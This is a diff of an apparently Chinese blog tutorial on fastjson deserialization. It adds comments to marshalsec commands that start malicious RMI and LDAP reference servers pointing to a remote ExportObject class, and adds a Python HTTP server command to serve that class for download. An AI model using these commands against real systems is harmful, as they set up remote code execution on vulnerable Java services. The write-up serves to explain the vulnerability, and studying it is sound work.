@@ -1065,9 +1065,13 @@
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>通过marshalsec 快速搭建RMIReference server or LDAP server</p>
-<pre class="line-numbers language-shell"><code class="language-shell">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:8080/文件夹/#ExportObject 8088
+<pre class="line-numbers language-shell"><code class="language-shell">#最后一个默认是1099，注册中心的绑定地址
+#将所有命名解析请求都返回 http://ip:8080/文件夹/#ExportOb 的Refere引用
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:8080/文件夹/#ExportObject 8088
 
-java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:8080/文件夹/#ExportObject 8088<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:8080/文件夹/#ExportObject 8088<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>python起服务器提供class下载</p>
+<pre class="line-numbers language-shell"><code class="language-shell">python -m http.server 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>运行结果</p>
 <p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201226201721929.png" alt="image-20201226201721929"></p>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>1.<a href="https://github.com/alibaba/fastjson/wiki/security_update_20170315" target="_blank" rel="noopener">fastjson 安全公告</a></p>
@@ -1844,7 +1848,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">37.9k</span> 字
+                <span class="white-color">39.4k</span> 字
             
 
             
